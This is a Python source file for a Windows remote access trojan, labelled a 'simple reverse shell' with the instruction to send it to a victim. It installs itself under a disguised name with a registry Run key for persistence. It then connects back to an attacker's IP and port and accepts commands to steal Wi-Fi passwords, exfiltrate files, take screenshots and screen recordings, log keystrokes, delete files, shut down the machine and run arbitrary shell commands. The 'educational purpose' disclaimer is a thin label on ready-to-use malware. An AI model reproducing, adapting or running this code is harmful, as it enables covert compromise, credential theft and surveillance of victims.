#!/usr/bin/python
# Simple Reverse Shell Written by: Ditiss acts pune
# [NOTE] Only for Educational Purpose. [/NOTE] 
#
#
# [!] Send this to Victim. After Changing Ip Address,port.in the line 75

import sys
import socket,subprocess
import traceback
import time
import os
from PIL import ImageGrab
import shutil
from _winreg import *
import ctypes
import getpass
import platform
import urllib
import uuid
import pyHook,pythoncom,logging
import cv2
import numpy as np
import pyautogui

SURVEY_FORMAT = '''
System Platform     - {}
Processor           - {}
Architecture        - {}
Internal IP         - {}
External IP         - {}
MAC Address         - {}
Internal Hostname   - {}
External Hostname   - {}
Hostname Aliases    - {}
FQDN                - {}
Current User        - {}
System Datetime     - {}
Admin Access        - {}'''

dist=""
curntfile=sys.argv[0]                   #current file name
servername="/setup.exe"
username=os.getenv('USERNAME')

if os.path.exists("C:/Documents and Settings/"+username): # xp users
    dist="C:/Documents and Settings/"+username+"/regky"
    print "found path", dist
    if not os.path.isdir(dist):             #moving file to new directory
        os.mkdir(dist)
    try:
        shutil.copy2(curntfile, dist+servername)
        print "file copied to:",dist+servername
        aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"System explore",0, REG_SZ, "C:\\Documents and Settings\\"+username+"\\regky\\setup.exe" )
        print "regkey added","C:\\Documents and Settings\\"+username+"\\regky\\setup.exe"
    except:
        pass

elif os.path.exists("C:/Users/"+username): # for windwos 7
    dist="C:/Users/"+username+"/regky"
    print   "found path", dist
    if not os.path.isdir(dist):             #moving file to new directory
            os.mkdir(dist)
    try:
        shutil.copy2(curntfile, dist+servername)
        print "file copied to:",dist+servername
        aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"System explore",0, REG_SZ, "C:\\Users\\"+username+"\\regky\\setup.exe" )
        print "regkey added","C:\\Users\\"+username+"\\regky\\setup.exe"
    except:
        pass

def do_work( forever = True):


    while True:

        # start with a socket at 5-second timeout
        print "Creating the socket"
        s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout( 5.0)

        # check and turn on TCP Keepalive
        x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
        if( x == 0):
            print 'Socket Keepalive off, turning on'
            x = s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            print 'setsockopt=', x
        else:
            print 'Socket Keepalive already on'

        try:
            s.connect(('127.0.0.1',4444)) #YOUR IP AND PORT FOR REVERSE CONNECTION
        except socket.error:
            print 'Socket connect failed! Loop up and try socket again'
            time.sleep( 10)
            continue

        print 'Socket connect worked!'

        while 1:
            try:
                data = s.recv(1024)
                if data == "quit":
                      break
                elif data.startswith('download')==True:
                    sendFile=data[9:]
                    time.sleep(.5)
                    if os.path.isfile(sendFile):
                        with open(sendFile,'rb')as f:
                            while 1:
                                filedata=f.read()
                                if filedata==None:break
                                s.sendall(filedata)
                        f.close()
                        time.sleep(0.8)
                        s.sendall('EOFEOFX')
                    else:
                        s.send('EOFEOFX')
                        s.send('invalid filename')
         ######invalid filename funtion
                elif data.startswith('invalid')==True:
                    s.send('failed.. invalid filename')
    ########delete file funtion
                elif data.startswith('del')==True:
                    filename=data[4:]
                    try:
                        os.remove(filename)
                        s.send('Deleted')
                    except os.error:
                        s.send('Invalid filename')
    ######## wifipass
                elif data.startswith('wifipass')==True:
                    st=""
                    a=subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
                    a= [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
                    for i in a:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        try:
                            #st=st+"\n"+i+" |    "+results[0]
                            st=st+"\n"+"{:<30}|  {:<}".format(i, results[0])
                        except IndexError:
                            #st=st+"\n"+i+" |    "+""
                            st=st+"\n"+"{:<30}|  {:<}".format(i, "")
                    s.send(st)
     ########### survey
                elif data.startswith('survey')==True:
                    #os info
                    sys_platform = platform.platform()
                    processor    = platform.processor()
                    architecture = platform.architecture()[0]

                    #session info
                    username = getpass.getuser()

                    #network info
                    hostname=socket.gethostname()
                    fqdn=socket.getfqdn()
                    try:
                        internal_ip = socket.gethostbyname(hostname)
                    except socket.gaierror:
                        internal_ip = ''
                    raw_mac     = uuid.getnode()
                    mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))
                    # get external ip address
                    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                                   'ipecho.net/plain', 'myexternalip.com/raw',
                                   'wtfismyip.com/text' ]
                    external_ip = ''
                    for url in ex_ip_grab:
                        try:
                            external_ip = urllib.urlopen('http://'+url).read().rstrip()
                        except IOError:
                            pass
                        if external_ip and (6 < len(external_ip) < 16):
                            break
                    # reverse dns lookup
                    try:
                        ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
                    except (socket.herror, NameError):
                        ext_hostname, aliases = '', []
                        aliases = ', '.join(aliases)
                    # datetime, local non-DST timezone
                    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
                                       time.localtime())
                    # platform specific
                    is_admin = False
                  #  if plat == 'win':
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                  #  elif plat in ['nix', 'mac']:
                    #    is_admin = os.getuid() == 0
                    admin_access = 'Yes' if is_admin else 'No'
                    # return survey results
                    s.send(SURVEY_FORMAT.format(sys_platform, processor, architecture,
                                                internal_ip, external_ip, mac, hostname, ext_hostname, aliases, fqdn,
                                                username, dt, admin_access))
       
      ########### dir changing
                elif data.startswith('cd')==True:
                    path=data[3:]
                    try:
                        os.chdir(path)
                        s.sendall(os.getcwd())
                    except:
                        s.send("path not found")
                        
        ########## popup custom msg
                elif data.startswith('popup')==True:
                    #message='example'
                    msg=data[6:]
                    ctypes.windll.user32.MessageBoxA(0,msg,"SPY-LAB",1)
                    resp = "[+] Popup window successfully executed\n"
                    s.send(resp) 
      ########### shutdown 
                elif data.startswith('shutdown')==True:
                     try:
                         os.system('shutdown -s')      
                     except:
                         s.send("error")
      ###########  restart
                elif data.startswith('restart')==True:
                     try:
                         os.system("shutdown /r /t 1")       
                     except:
                         s.send("error")
      ########### sleepst
                elif data.startswith('sleepst')==True:
                     try:
                          os.system("shutdown.exe /h")       
                     except:
                         s.send("error")
    ########### logout
                elif data.startswith('logout')==True:
                     try:
                          os.system("shutdown -l")       
                     except:
                         s.send("error")
    ############ open file on victim machin
                elif data.startswith('openfile')==True:
                     try:
                           openf=s.recv(1024)
                           def openFile():
                             try:
                               os.startfile(openf)
                             except Exception, e:
                               print str(e)
                           openFile()           
                     except:
                         s.send("error")
                         
      ################### screen recording
                elif data.startswith('sreen_rec')==True:
                     try:
                            output = "video.avi"
                            img = pyautogui.screenshot()
                            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                            #get info from img
                            height, width, channels = img.shape
                            # Define the codec and create VideoWriter object
                            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                            out = cv2.VideoWriter(output, fourcc, 20.0, (width, height))

                            while(True):
                             try:
                              img = pyautogui.screenshot()
                              image = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                              out.write(image)
                              StopIteration(0.5)
                             except KeyboardInterrupt:
                              break

                            out.release()
                            cv2.destroyAllWindows()
                     except:
                            s.send("error")
      ########### keylogger                  
                elif data.startswith('keylogger')==True:
                     file_log=os.getcwd()+"\keylog.txt"
                     def onKeyboardEvent(event):
                         logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
                         chr(event.Ascii)
                         logging.log(10,chr(event.Ascii))
                         return True
                     hooks_manager=pyHook.HookManager()
                     hooks_manager.KeyDown=onKeyboardEvent
                     hooks_manager.HookKeyboard()
                     pythoncom.PumpMessages()
   
                    
        #########screenshot function
                elif data.startswith('pic')==True:
                    image=data[4:]
                    ImageGrab.grab().save(image,"JPEG")
                    time.sleep(.5)
                    if os.path.isfile(image):
                        with open(image,'rb')as f:
                            while 1:
                                filedata=f.read()
                                if filedata==None:break
                                s.sendall(filedata)
                        f.close()
                        time.sleep(0.8)
                        s.sendall('EOFEOFX')
                    else:
                        s.send('EOFEOFX')
                        s.send('invalid filename')
                    s.send('image saved')
        ##########uploader
                elif data.startswith("upload")== True:
                    downFile=data[7:]
                    try:
                        f=open(downFile,'wb')
                        while True:
                            l=s.recv(1024)
                            while 1:
                                if l.endswith('EOFEOFX'):
                                    u=l[:-7]
                                    f.write(u)
                                    break
                                else:
                                    f.write(l)
                                    l=s.recv(1024)
                            break
                        f.close()
                        s.send('Done')
                    except:
                        pass

                else:
                    # do shell command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    # read output
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    # send output to attacker

                    if len(stdout_value)==0:
                        s.send("command successfull")
                    else:
                        s.send(stdout_value)

            except socket.timeout:
                print 'Socket timeout, loop and try recv() again'
                time.sleep(0)
                # traceback.print_exc()
                continue

            except:
                traceback.print_exc()
                print 'Other Socket err, exit and try creating socket again'
                # break from loop
                break

        try:
            s.close()
        except:
            pass


if __name__ == '__main__':

    do_work( True) 
